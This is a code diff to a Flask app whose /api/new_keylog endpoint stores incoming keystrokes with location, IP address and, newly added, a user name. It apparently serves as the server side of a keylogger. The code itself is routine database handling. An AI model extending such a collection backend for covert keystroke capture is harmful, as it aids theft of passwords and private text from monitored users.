@@ -37,6 +37,7 @@ class Key_strokes(db.Model):
     key = db.Column(db.String(15), nullable = False)
     location = db.Column(db.String(30), nullable = False)
     ip_address = db.Column(db.String(30), nullable = True)
+    user = db.Column(db.String(30), nullable = True)
     timestamp = db.Column(db.DateTime(timezone=True), default = datetime.utcnow)
 
 class Login(db.Model):
@@ -96,13 +97,14 @@ def delete_blog(id):
 @app.route("/api/new_keylog", methods=['POST'])
 def new_keylog():
     request_data=json.loads(request.data)
+    print(request_data)
     key = request_data['key']
     location = request_data['location']
     ip_address = request_data['ip_address']
+    user = request_data['user']
 
-    print(ip_address)
 
-    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address)
+    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address, user=user)
     db.session.add(new_blog)
     db.session.commit()
     return {'msg': 'success added successfully'}
@@ -119,6 +121,7 @@ def keylogs_serializer(blog):
         'key': blog.key,
         'location': blog.location,
         'ip_address': blog.ip_address,
+        'user': blog.user,
         'timestamp': blog.timestamp
     }
 
@@ -145,7 +148,7 @@ def register_user():
 
     check_user = Login.query.filter_by(username=username).first()
     if check_user:
-        return {'msg':'username already exists. Try a different one'}, 403
+        return {'error':'username already exists. Try a different one'}, 403
 
     new_user = Login(username=username, usertype='USER', password=generate_password_hash(password, method='sha256'))
     db.session.add(new_user)
